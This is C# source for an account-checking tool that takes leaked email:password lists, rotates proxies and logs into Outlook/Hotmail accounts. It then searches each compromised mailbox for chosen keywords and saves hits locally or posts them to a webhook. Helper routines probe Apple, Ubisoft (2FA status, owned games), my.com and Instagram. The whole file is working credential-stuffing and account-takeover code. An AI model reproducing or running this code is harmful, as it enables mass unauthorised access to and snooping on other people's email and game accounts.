using System; using Galaxy.Mainm;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using AuthGG;
using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using ZuttPal;
using Console = Colorful.Console;
namespace ZuttPal
{
	internal class Hotmailinbox1kek
	{
		public static string Path1;
		public static string Path;
		private static ReaderWriterLockSlim locker = new ReaderWriterLockSlim();
		public static void startchecker1()
		{
			for (; ; )
			{
				while (!Hotmailinbox1check.Combo.IsEmpty)
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Hotmailinbox1check.Combo.TryDequeue(out string acc))
						{
							try
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								string account = email + ":" + password;
								httpRequest.IgnoreProtocolErrors = true;
								httpRequest.KeepAlive = true;
								httpRequest.ConnectTimeout = Program.config.timeout;
								httpRequest.IgnoreProtocolErrors = true;
								if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmailinbox1check.RandomProxies();
								var ua = Http.RandomUserAgent();
								httpRequest.AddHeader("User-Agent", ua);
								httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
								httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
								httpRequest.AddHeader("Accept-Encoding", "null");
								httpRequest.AddHeader("Referer", "https://outlook.live.com/owa/0?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMA");
								httpRequest.AddHeader("DNT", "1");
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");

								var res0 = httpRequest.Get("https://outlook.live.com/owa/0?state=1&redirectTo=aHR0cHM6Ly9vdXRsb29rLmxpdmUuY29tL21haWwvMA&nlp=1");
								string FIRST_REQUEST = res0.ToString();

								var HPGID = Functions.LR(FIRST_REQUEST, "hpgid:", ",").FirstOrDefault();
								var UAID = httpRequest.Cookies.GetCookies(res0.Address)["uaid"].Value;
								var FLOWTOKEN = Regex.Match(FIRST_REQUEST, "name=\"PPFT\" id=\".+?\" value=\"(.+?)\"").Groups[1].Value;
								var LOGIN_CHECK_ADDRESS = Regex.Match(FIRST_REQUEST, "(?is:'(https://login\\.live\\.com/ppsecure/post\\.srf.+?)')").Groups[1].Value;

								httpRequest.AllowAutoRedirect = false;
								httpRequest.EnableEncodingContent = true;
								httpRequest.AddHeader("Host", "login.live.com");
								httpRequest.AddHeader("User-Agent", ua);
								httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
								httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
								httpRequest.AddHeader("Accept-Encoding", "null");
								httpRequest.AddHeader("Referer", $"https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=<STATE>&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup");
								httpRequest.AddHeader("Origin", "https://login.live.com");
								httpRequest.AddHeader("DNT", "1");
								httpRequest.AddHeader("Connection", "keep-alive");
								httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");

								var res1 = httpRequest.Post(LOGIN_CHECK_ADDRESS, $"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&KMSI=on&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={FLOWTOKEN}&PPSX=P&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i2=1&i17=0&i18=&i19=3500", "application/x-www-form-urlencoded");
								string SECOND_REQUEST = res1.ToString();

								if (SECOND_REQUEST.Contains("sErrTxt:'Your account or password is incorrect."))
								{
									lock (Program.WriteLock)
									{
										Interlocked.Increment(ref Hotmailinbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
										Interlocked.Increment(ref Hotmailinbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
										Interlocked.Increment(ref Hotmailinbox1check.Bad); Interlocked.Increment(ref stats.bad);
										if (Program.config.showgood == "True" && Program.config.ui == 2)
										{
											Colorful.Console.WriteLine("[»] Invalid " + account, Color.Red);
										}
										Save(Path + "\\Invalid.txt", account);
									}
									break;
								}
								else if (SECOND_REQUEST.Contains("name=\"t\" id=\"t\" value=\""))
								{
									var PREREQ_DETAILS_ADDRESS = Functions.LR(SECOND_REQUEST, "id=\"fmHF\" action=\"", "\"").FirstOrDefault();
									var NAPEXP = Functions.LR(SECOND_REQUEST, "id=\"NAPExp\" value=\"", "\"").FirstOrDefault();
									var WBIDS = Functions.LR(SECOND_REQUEST, "id=\"wbids\" value=\"", "\"").FirstOrDefault();
									var PPRID = Functions.LR(SECOND_REQUEST, "id=\"pprid\" value=\"", "\"").FirstOrDefault();
									var WBID = Functions.LR(SECOND_REQUEST, "id=\"wbid\" value=\"", "\"").FirstOrDefault();
									var NAP = Functions.LR(SECOND_REQUEST, "id=\"NAP\" value=\"", "\"").FirstOrDefault();
									var ANON = Functions.LR(SECOND_REQUEST, "id=\"ANON\" value=\"", "\"").FirstOrDefault();
									var ANONEXP = Functions.LR(SECOND_REQUEST, "id=\"ANONExp\" value=\"", "\"").FirstOrDefault();
									var T = Functions.LR(SECOND_REQUEST, "id=\"t\" value=\"", "\"").FirstOrDefault();

									httpRequest.EnableEncodingContent = true;
									httpRequest.AddHeader("user-agent", ua);
									httpRequest.AddHeader("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
									httpRequest.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
									httpRequest.AddHeader("accept-encoding", "null");
									httpRequest.AddHeader("referer", "https://login.live.com/");
									httpRequest.AddHeader("origin", "https://login.live.com");
									httpRequest.AddHeader("dnt", "1");
									string ok = httpRequest.Post(PREREQ_DETAILS_ADDRESS, $"NAPExp={NAPEXP}&wbids={WBIDS}&pprid={PPRID}&wbid={WBID}&NAP={NAP}&ANON={ANON}&ANONExp={ANONEXP}&t={T}", "application/x-www-form-urlencoded").ToString();

									httpRequest.AllowAutoRedirect = false;
									httpRequest.AddHeader("user-agent", ua);
									httpRequest.AddHeader("accept", "*/*");
									httpRequest.AddHeader("accept-language", "ach,en-GB;q=0.8,en-US;q=0.5,en;q=0.3");
									httpRequest.AddHeader("accept-encoding", "null");
									httpRequest.AddHeader("referer", "https://outlook.live.com/");
									httpRequest.AddHeader("action", "StartupData");
									httpRequest.AddHeader("x-js-clienttype", "2");
									httpRequest.AddHeader("x-js-experiment", "1");
									httpRequest.AddHeader("x-owa-canary", "X-OWA-CANARY_cookie_is_null_or_empty");
									httpRequest.AddHeader("x-req-source", "Mail");
									httpRequest.AddHeader("Mail", "https://outlook.live.com");
									httpRequest.AddHeader("dnt", "1");
									string ok1 = httpRequest.Get("https://outlook.live.com/owa/0/startupdata.ashx?app=Mail&n=0").ToString();

									httpRequest.AllowAutoRedirect = false;
									httpRequest.AddHeader("user-agent", ua);
									httpRequest.AddHeader("accept", "*/*");
									httpRequest.AddHeader("accept-language", "accept-language");
									httpRequest.AddHeader("accept-encoding", "gzip, deflate, br");
									httpRequest.AddHeader("referer", "https://outlook.live.com/");
									httpRequest.AddHeader("action", "GetAccessTokenforResource");
									httpRequest.AddHeader("x-owa-canary", httpRequest.Cookies.GetCookies("https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail")["X-OWA-CANARY"].Value);
									httpRequest.AddHeader("x-owa-urlpostdata", "%7B%22__type%22%3A%22TokenRequest%3A%23Exchange%22%2C%22Resource%22%3A%22https%3A%2F%2Foutlook.live.com%22%7D");
									httpRequest.AddHeader("x-req-source", "Mail");
									httpRequest.AddHeader("origin", "https://outlook.live.com");
									httpRequest.AddHeader("dnt", "1");

									string ok2 = httpRequest.Post("https://outlook.live.com/owa/0/service.svc?action=GetAccessTokenforResource&UA=0&app=Mail", "w", "application/json").ToString();

									if (!ok2.Contains("AccessToken"))
									{
										string acc1 = email + ":" + password;
										Hotmailinbox1check.Combo.Enqueue(acc1);
										Interlocked.Increment(ref Hotmailinbox1check.retry);
									}

									var ACCESS_TOKEN = Functions.JSON(ok2, "AccessToken").FirstOrDefault();
									var CVID = Guid.NewGuid().ToString();

									foreach (string line in File.ReadAllLines("Data//Keywords.txt"))
									{
										httpRequest.AllowAutoRedirect = false;
										httpRequest.AddHeader("authorization", $"Bearer {ACCESS_TOKEN}");
										string final = httpRequest.Post("https://outlook.live.com/search/api/v1/query", "{\"Cvid\":\"" + CVID + "\",\"Scenario\":{\"Name\":\"owa.react\"},\"TimeZone\":\"Pacific Standard Time\",\"TextDecorations\":\"Off\",\"EntityRequests\":[{\"EntityType\":\"Conversation\",\"Filter\":{\"Or\":[{\"Term\":{\"DistinguishedFolderName\":\"msgfolderroot\"}},{\"Term\":{\"DistinguishedFolderName\":\"DeletedItems\"}}]},\"From\":0,\"Provenances\":[\"Exchange\"],\"Query\":{\"QueryString\":\"" + line + "\"},\"RefiningQueries\":null,\"Size\":25,\"Sort\":[{\"Field\":\"Score\",\"SortDirection\":\"Desc\",\"Count\":3},{\"Field\":\"Time\",\"SortDirection\":\"Desc\"}],\"QueryAlterationOptions\":{\"EnableSuggestion\":true,\"EnableAlteration\":true,\"SupportedRecourseDisplayTypes\":[\"Suggestion\",\"NoResultModification\",\"NoResultFolderRefinerModification\",\"NoRequeryModification\"]},\"PropertySet\":\"ProvenanceOptimized\"}],\"LogicalId\":\"" + CVID + "\"}", "application/json").ToString();


										if (final.Contains("\"ApiVersion\""))
										{
											var NAMES = string.Join(",", Functions.LR(final, "\"Address\":\"", "\"", true));
											int a = Regex.Matches(NAMES, line).Count;

											if (a == 0)
											{
												lock (Program.WriteLock)
												{
													Interlocked.Increment(ref Hotmailinbox1check.CheckedLines); Interlocked.Increment(ref stats.checcc);
													Interlocked.Increment(ref Hotmailinbox1check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
													Interlocked.Increment(ref Hotmailinbox1check.custom);
													if (Program.config.showlocked == "True" && Program.config.ui == 2)
													{
														Colorful.Console.WriteLine("[»] Custom " + account, Color.HotPink);
													}
													if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Custom.txt", account);
												}
												break;
											}
											else
											{
												lock (Program.WriteLock)
												{
													Interlocked.Increment(ref YahooInbox2check.CheckedLines); Interlocked.Increment(ref stats.checcc);
													Interlocked.Increment(ref YahooInbox2check.currentCpm); Interlocked.Increment(ref stats.currentCpm);
													Interlocked.Increment(ref YahooInbox2check.Hits); Interlocked.Increment(ref stats.hits);
													string cap = account + $" | Keyword: " + line + " | Results: " + a;
													if (Program.config.showgood == "True" && Program.config.ui == 2)
													{
														Colorful.Console.WriteLine("[»] Valid " + cap, Color.Green);
													}
													if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path1 + $"\\{line}.txt", cap);
													if (Program.config.hitstowebhook == "True") { string data1 = "{\"username\": \"Hit Sender\",\"embeds\":[    {\"description\":\"[+] Hit: " + account + "\", \"title\":\"" + Checking.currentrun + "\", \"color\":1018364}]  }"; string hitsend = httpRequest.Post(Program.config.webhook, data1, "application/json").ToString();}Save(Path + "\\Valid.txt", account);
												}
												break;
											}
										}
									}
								}

								else
                                {
									string acc1 = email + ":" + password;
									Hotmailinbox1check.Combo.Enqueue(acc1);
									Interlocked.Increment(ref Hotmailinbox1check.retry);
								}
							}
							catch (Exception)
							{
								var array = acc.Split(new char[3] { ':', ';', '|' });
								var email = array[0];
								var password = array[1];
								var account = email + password;
								string acc1 = email + ":" + password;
								Hotmailinbox1check.Combo.Enqueue(acc1);
								Interlocked.Increment(ref Hotmailinbox1check.retry);
							}
						}
					}
				}
			}
		}
		private readonly Random _random = new Random();
		private static string RandomString(int length)
		{
			const string pool = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
			var builder = new StringBuilder();

			for (var i = 0; i < length; i++)
			{
				var c = pool[random.Next(0, pool.Length)];
				builder.Append(c);
			}

			return builder.ToString();
		}
		static string AppleGetToken(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmailinbox1check.RandomProxies();
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36";
						httpRequest.AddHeader("Accept", "*/*");

						string strResponse = httpRequest.Get(new Uri("https://secure4.store.apple.com/shop/sign_in?c=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ&r=SCDHYHP7CY4H9XK2H&s=aHR0cHM6Ly93d3cuYXBwbGUuY29tL3wxYW9zZTQyMmM4Y2NkMTc4NWJhN2U2ZDI2NWFmYWU3NWI4YTJhZGIyYzAwZQ")).ToString();

						if (strResponse.Contains("stk\":\""))
						{
							return Regex.Match(strResponse, "stk\":\"(.*?)\"}").Groups[1].Value;
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref Hotmailinbox1check.retry);
				}
			}
		}
			


						public int RandomNumber(int min, int max)
		{
			return _random.Next(min, max);
		}

		static Random random = new Random();
		public string RandomString(int size, bool lowerCase = false)
		{
			var builder = new StringBuilder(size);

			// char is a single Unicode character  
			char offset = lowerCase ? 'a' : 'A';
			const int lettersOffset = 26; // A...Z or a..z: length = 26  

			for (var i = 0; i < size; i++)
			{
				var @char = (char)_random.Next(offset, offset + lettersOffset);
				builder.Append(@char);
			}

			return lowerCase ? builder.ToString().ToLower() : builder.ToString();
		}
		public string RandomPassword()
		{
			var passwordBuilder = new StringBuilder();

			// 4-Digits between 1000 and 9999  
			passwordBuilder.Append(RandomNumber(1000, 9999));

			// 2-Letters upper case  
			passwordBuilder.Append(RandomString(2));
			return passwordBuilder.ToString();
		}
		public static string GetRandomHexNumber(int digits)
		{
			byte[] buffer = new byte[digits / 2];
			random.NextBytes(buffer);
			string result = String.Concat(buffer.Select(x => x.ToString("X2")).ToArray());
			if (digits % 2 == 0)
				return result;
			return result + random.Next(16).ToString("X");
		}
		private static string UPlayHas2FA(string ticket, string sessionId)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = Hotmailinbox1check.RandomProxies();
						req.AddHeader("Ubi-SessionId", sessionId);
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string str = req.Get(new Uri("https://public-ubiservices.ubi.com/v3/profiles/me/2fa")).ToString();
						if (str.Contains("active"))
						{
							if (str.Contains("true"))
								return "true";
							if (str.Contains("false"))
								return "false";
						}
					}
				}
				catch
				{
					Interlocked.Increment(ref Hotmailinbox1check.retry);
				}
			}
		}

		private static string UPlayGetGames(string ticket)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest req = new Leaf.xNet.HttpRequest())
					{
						req.Proxy = Hotmailinbox1check.RandomProxies();
						req.AddHeader("Ubi-AppId", "e06033f4-28a4-43fb-8313-6c2d882bc4a6");
						req.Authorization = "Ubi_v1 t=" + ticket;
						string input = req.Get(new Uri("https://public-ubiservices.ubi.com/v1/profiles/me/club/aggregation/website/games/owned")).ToString();
						if (input.Contains("[") && input != "[]")
						{
							Match match1 = Regex.Match(input, "\"slug\":\"(.*?)\"");
							Match match2 = Regex.Match(input, "\"platform\":\"(.*?)\"");
							string str1 = "";
							string str2;
							while (true)
							{
								str2 = str1 + "[" + match1.Groups[1].Value + " - " + match2.Groups[1].Value + "]";
								match1 = match1.NextMatch();
								match2 = match2.NextMatch();
								if (!(match1.Groups[1].Value == ""))
									str1 = str2 + ", ";
								else
									break;
							}
							return str2;
						}
					}
				}
				catch
				{
				}
			}
		}

			private static string MailAccessCheck(string email, string password)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmailinbox1check.RandomProxies();
						httpRequest.UserAgent = "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0";
						if (httpRequest.Get(new Uri("https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS¤t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=" + email + "&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=" + password + "&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&")).ToString().Contains("Ok=1"))
							return "Working";
						break;
					}
				}
				catch
				{
					string acc1 = email + ":" + password;
					Hotmailinbox1check.Combo.Enqueue(acc1);
					Interlocked.Increment(ref Hotmailinbox1check.retry);
				}
			}
			return "";
		}
		private static string InstagramGetCSRF(ref CookieStorage cookies)
		{
			while (true)
			{
				try
				{
					using (Leaf.xNet.HttpRequest httpRequest = new Leaf.xNet.HttpRequest())
					{
						if (Program.config.proxytype.ToUpper() == "PROXYLESS") { string hora = "MK";  } else httpRequest.Proxy = Hotmailinbox1check.RandomProxies();
						httpRequest.IgnoreProtocolErrors = true;
						httpRequest.AllowAutoRedirect = false;
						cookies = new CookieStorage();
						httpRequest.Cookies = cookies;
						httpRequest.UserAgent = "Instagram 25.0.0.26.136 Android (24/7.0; 480dpi; 1080x1920; samsung; SM-J730F; j7y17lte; samsungexynos7870)";
						httpRequest.Get(new Uri("https://i.instagram.com/api/v1/accounts/login/")).ToString();
						return cookies.GetCookies("https://i.instagram.com")["csrftoken"].Value;
					}
				}
				catch
				{
					Interlocked.Increment(ref Hotmailinbox1check.retry);
				}
			}
		}

		public static string yey(string source, string left, string right)
		{
			return source.Split(new string[]
			{
				left
			}, StringSplitOptions.None)[1].Split(new string[]
			{
				right
			}, StringSplitOptions.None)[0];
		}
		public static void Save(string path, string line)
			{
			for (; ; )
			{
				try
				{
					File.AppendAllLines(path ?? "", new List<string>
					{
						line
					}, Encoding.UTF8);
					break;
				}
				catch
				{
				}
			}
		}
		public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
		public static string uri = "";

		public static string auther = "";

		public static string showbad = "";

		public static string showlocked = "";

		public static List<string> Tokens = new List<string>();

		public static List<string> Urls = new List<string>();

		public static List<string> Auther = new List<string>();

		public static List<ProxyClient> ProxyList = new List<ProxyClient>();
	}
}
